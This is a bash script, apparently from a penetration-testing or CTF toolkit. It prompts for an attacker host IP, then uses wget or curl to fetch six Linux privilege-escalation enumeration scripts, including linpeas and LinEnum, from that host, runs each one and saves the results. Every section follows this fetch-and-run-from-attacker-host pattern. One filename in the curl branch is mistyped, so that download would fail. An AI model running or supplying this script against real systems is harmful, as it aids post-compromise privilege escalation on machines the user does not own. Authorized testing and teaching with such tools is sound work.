#!/usr/bin/bash

if [ -e LHOST.txt ] ; then
   cat LHOST.txt
else
   read -p "LHOST IP > " IP
   touch LHOST.txt
   echo $IP > LHOST.txt 
fi

lhost=$(cat LHOST.txt) 

rm LinEnum.sh ; rm LinEnum.txt
rm linpeas.sh ; rm linpeas.txt
rm linux-exploit-suggester-2.pl ; rm linux-exploit-suggester-2.txt
rm linuxprivchecker.py ; rm linuxprivchecker.txt 
rm lse.sh ; rm lse.txt 
rm unix-privesc-check.sh ; rm unix-privesc-check.txt 

which wget ; which curl
read -p "wget or curl ? > " input

if [ $input =  "wget" ] ; then
   set -x
##### LinEnum Section #######
   cd $(pwd)
   wget http://"$lhost":80/linux/script/LinEnum.sh
   chmod 700 LinEnum.sh
   ./LinEnum.sh -t > LinEnum.txt 2>&1
#############################

##### LinPEAS Section #######
   cd $(pwd)
   wget http://"$lhost":80/linux/script/linpeas.sh
   chmod 700 linpeas.sh
   ./linpeas.sh > linpeas.txt  2>&1
#############################

##### Linux Exploit Suggester Section #######
   cd $(pwd)
   wget http://"$lhost":80/linux/script/linux-exploit-suggester-2.pl
   chmod 700 linux-exploit-suggester-2.pl
   ./linux-exploit-suggester-2.pl > linux-exploit-suggester-2.txt  2>&1
#############################

##### Linux Privchecker Section #######
   cd $(pwd)
   wget http://"$lhost":80/linux/script/linuxprivchecker.py
   chmod 700 linuxprivchecker.py
   ./linuxprivchecker.py > linuxprivchecker.txt  2>&1
#######################################

##### Linux Lse Section #######
   cd $(pwd)
   wget http://"$lhost":80/linux/script/lse.sh
   chmod 700 lse.sh
   ./lse.sh -i -l 2 > lse.txt  2>&1
###############################

##### Linux Unix Privesc Section #######
   cd $(pwd)
   wget http://"$lhost":80/linux/script/unix-privesc-check.sh
   chmod 700 unix-privesc-check.sh
   ./unix-privesc-check.sh > unix-privesc-check.txt  2>&1
########################################
   set +x
fi

if [ $input =  "curl" ] ; then

   set -x
##### LinEnum Section #######
   cd $(pwd)
   curl -OL http://"$lhost":80/linux/script/LinEnum.sh
   chmod 700 LinEnum.sh
   ./LinEnum.sh > LinEnum.txt  2>&1
#############################

##### LinPEAS Section #######
   cd $(pwd)
   curl -OL http://"$lhost":80/linux/script/linpeas.sh
   chmod 700 linpeas.sh
   ./linpeas.sh > linpeas.txt  2>&1
#############################

##### Linux Exploit Suggester Section #######
   cd $(pwd)
   curl -OL http://"$lhost":80/linux/script/linux-exploit.suggester-2.pl
   chmod 700 linux-exploit.suggester-2.pl
   ./linux-exploit.suggester-2.pl > linux-exploit-suggester-2.txt  2>&1
#############################

##### Linux Privchecker Section #######
   cd $(pwd)
   curl -OL http://"$lhost":80/linux/script/linuxprivchecker.py
   chmod 700 linuxprivchecker.py
   ./linuxprivchecker.py > linuxprivchecker.txt  2>&1
#######################################

##### Linux Lse Section #######
   cd $(pwd)
   curl -OL http://"$lhost":80/linux/script/lse.sh
   chmod 700 lse.sh
   ./lse.sh > lse.txt  2>&1
###############################

##### Linux Unix Privesc Section #######
   cd $(pwd)
   curl -OL http://"$lhost":80/linux/script/unix-privesc-check.sh
   chmod 700 unix-privesc-check.sh
   ./unix-privesc-check.sh > unix-privesc-check.txt  2>&1
########################################
   set +x
fi
